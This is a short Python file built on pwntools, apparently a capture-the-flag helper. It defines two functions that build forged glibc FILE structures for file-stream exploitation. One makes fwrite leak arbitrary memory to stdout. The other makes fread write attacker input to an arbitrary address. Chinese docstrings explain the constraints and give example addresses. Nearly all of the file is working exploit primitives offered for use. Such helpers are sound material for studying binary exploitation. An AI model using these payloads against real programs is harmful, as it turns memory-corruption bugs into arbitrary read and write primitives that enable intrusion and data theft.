from pwn import FileStructure


def FILE_read_payload(src_addr: int, size: int, lock_addr: int):
    '''
    ### Description

    回傳一個 `FILE` structure，如果 `fp` 指向這個 `FILE` structure，可以讓呼叫
    `fwrite(buf, write_size, 1, fp)` 的時候印出 `src_addr` ~ `src + size - 1` 和
    `buf` ~ `buf + write_size - 1` 到 stdout，並把 `fp` 指向的 `FILE` 的 `_IO_read_*`
    和 `_IO_write_*` 都寫 0

    ---
    ### Constrain

    - `src_addr` ~ `src_addr + size - 1` 可讀
    - `lock_addr` ~ `lock_addr + 15` 可讀可寫且沒有被使用

    ---
    ### Example

    ```py
    src_addr = 0x404050
    lock_addr = 0x405000 - 0x100

    payload = FILE_read_payload(src_addr, 0x100, lock_addr)
    ```
    '''

    f = FileStructure()
    f.flags, f.fileno = 0xfbad0800, 1
    f._IO_write_base, f._IO_write_ptr, f._IO_write_end = src_addr, src_addr + size, 0
    f._IO_read_end = src_addr
    f._lock = lock_addr

    return bytes(f)[:-8]


def FILE_write_payload(target_addr: int, size: int, lock_addr: int):
    '''
    ### Description

    回傳一個 `FILE` structure，如果 `fp` 指向這個 `FILE` structure，可以讓呼叫
    `fread(buf, read_size, 1, fp)` 的時候執行 `read(0, target_addr, size)`（這邊真正讀入
    的長度要大於 `read_size`）。

    讀入後會把 `target_addr` copy `read_size` bytes 到 `buf`，並把 `_IO_read_base`、
    `_IO_write_*` 都設成 `target_addr`，`_IO_read_ptr` 設成 `target_addr + read_size`
    和 `_IO_read_end` 設成 `target_addr + 讀入長度`。

    ---
    ### Constrain

    - `size` > `read_size`
    - `target_addr` ~ `target_addr + size - 1` 可寫
    - `lock_addr` ~ `lock_addr + 15` 可讀可寫且沒有被使用

    ---
    ### Example

    ```py
    target_addr = 0x404070
    lock_addr = 0x405000 - 0x100

    payload = FILE_write_payload(target_addr, 0x100, lock_addr)
    ```
    '''

    f = FileStructure()
    f.flags = 0xfbad0000
    f._IO_buf_base = target_addr
    f._IO_buf_end  = target_addr + size
    f._lock = lock_addr

    return bytes(f)[:-8]

